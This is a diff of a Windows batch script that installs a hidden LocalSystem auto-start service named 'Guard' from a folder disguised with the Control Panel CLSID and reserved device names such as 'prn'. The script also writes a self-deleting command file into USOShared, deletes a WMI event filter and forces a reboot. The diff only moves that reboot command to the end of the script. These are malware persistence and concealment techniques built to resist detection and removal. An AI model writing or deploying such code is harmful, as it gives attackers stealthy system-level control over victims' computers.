@@ -5,7 +5,7 @@ mkdir %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
 sc create Guard binPath="\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" start="auto" obj="LocalSystem"
 
 copy /Y "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe" "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe"
-(echo \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn & echo cmd.exe /c start "" powershell.exe -Command "Start-Sleep -Seconds 30; Restart-Computer -Force" & echo del /f "%~f0") > "%ProgramData%\USOShared\USOS.cmd"
+(echo \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn & echo del /f "%~f0") > "%ProgramData%\USOShared\USOS.cmd"
 
 rd /S /Q \\.\%ProgramData%\AUX..\
 rd /S /Q \\.\%ProgramData%\CON..\
@@ -50,3 +50,4 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Names
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='MCS'\" | Remove-WmiObject"
 
 %ProgramData%\USOShared\USOS.cmd
+cmd.exe /c start "" powershell.exe -Command "Start-Sleep -Seconds 30; Restart-Computer -Force"
